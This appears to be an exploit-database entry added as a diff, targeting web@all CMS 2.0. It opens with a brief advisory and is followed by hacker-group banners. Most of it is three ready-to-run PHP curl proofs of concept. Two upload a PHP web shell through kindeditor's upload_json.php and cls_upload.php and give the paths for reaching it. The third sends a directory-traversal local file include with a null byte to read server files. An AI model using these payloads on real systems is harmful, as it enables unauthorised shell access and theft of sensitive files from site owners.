@@ -1,0 +1,115 @@
+source: http://www.securityfocus.com/bid/55426/info
+
+web@all is prone to a local file-include vulnerability and multiple arbitrary file-upload vulnerabilities.
+
+An attacker can exploit these issues to upload arbitrary files onto the web server, execute arbitrary local files within the context of the web server, and obtain sensitive information.
+
+web@all 2.0 is vulnerable; other versions may also be affected. 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+###
+# Title : Web@all CMS v2.0 <= (ShellUpload/LFI) Multiple Vulnerabilities
+# Author : KedAns-Dz
+# E-mail : ked-h (@hotmail.com / @1337day.com)
+# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
+# Web Site : www.1337day.com | www.inj3ct0rs.com
+# FaCeb0ok : http://fb.me/Inj3ct0rK3d
+# Friendly Sites : www.r00tw0rm.com * www.exploit-id.com
+# Platform/CatID : php - WebApp - Multiple - 0day
+# Type : Multiple Vulnerabilities
+# Tested on : Windows XP-SP3 (Fr) / Linux.BackTrack5-rc2 (En)
+# Founder : [http://webatall.org]
+###
+
+# <3 <3 Greetings t0 Palestine <3 <3
+# Greetings bY {KhalEd Ked'Ans} ^___^ I MiSS yA'll br0thEr'S <3
+
+# n0 d0Rk's Kidd's d0 S0me W0rk's yaa33' -_-"
+
+<!-- Proof of Concept ,p0c(1) -->
+<!-- Shell Upload .PHP -->
+<?php
+
+$uploadfile="inj3ct0r.php";
+$ch = curl_init("http://[Target]/[path]/my/kindeditor/php/upload_json.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+       array('imgFile'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+[*] 0r Use TemperDATA ->(/[path]/my/kindeditor/php/upload_json.php) and POST u'R Sh3lL
+
+[!] Change inj3ct0r.php -> t0 U'r Sh3lL '_*
+[+] Access Shell http://[Target]/[path]/file/[ Ym 'dir]/{raW-File-Name}.php
+
+<!-- Proof of Concept ,p0c(2) -->
+<!-- Shell Upload .GIF -->
+<?php
+
+$uploadfile="inj3ct0r.gif";
+$ch = curl_init("http://[Target]/[path]/inc/cls_upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+       array('tmp_name'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+[*] 0r Use TemperDATA ->(/[path]/inc/cls_upload.php) and POST u'R Sh3lL
+
+[!] Change inj3ct0r.gif -> t0 U'r Sh3lL '_*
+[+] Access Shell http://[Target]/[path]/file/temp/[ Ym 'dir]/{raW-File-Name}.gif
+
+<!-- Proof of Concept ,p0c(3) -->
+<!-- Local File Include -->
+<?php
+$lfi =
+curl_init("http://[Target]/[path]/my/kindeditor/index.php");
+curl_setopt($lfi, CURLOPT_POST, true);
+curl_setopt($lfi, CURLOPT_POSTFIELDS,
+  array('lang'=>"../../../../../../../../[ LFI ]%00"));
+curl_setopt($lfi, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($lfi);
+curl_close($lfi);
+print "$postResult";
+?>
+
+[*] 0r Use TemperDATA ->(/[path]/my/kindeditor/index.php) POST and GET s0me Local File's
+
+#### << ThE|End -- Go0d'LuCk All .:-'___'-:. 
+
+#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]===============================================
+# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > | Indoushka , Caddy-Dz , Kalashinkov3 , Mennouchi.Islem 
+# Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz, KinG Of PiraTeS, TrOoN, T0xic, Chevr0sky, Black-ID, Barbaros-DZ,
+# +> Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (1337day.com) * CrosS (r00tw0rm.com)
+# Inj3ct0r Members 31337 : KedAns ^^ * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * Angel Injection
+# NuxbieCyber (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * xDZx * HD Moore * YMCMB ..all
+# Exploit-ID Team : jos_ali_joe + kaMtiEz + r3m1ck (exploit-id.com) * Milw0rm * KeyStr0ke * JF * L3b-r1Z * HMD
+# packetstormsecurity.org * metasploit.com * r00tw0rm.com * OWASP Dz * Dis9-UE * All Security and Exploits Webs
+#============================================================================================================
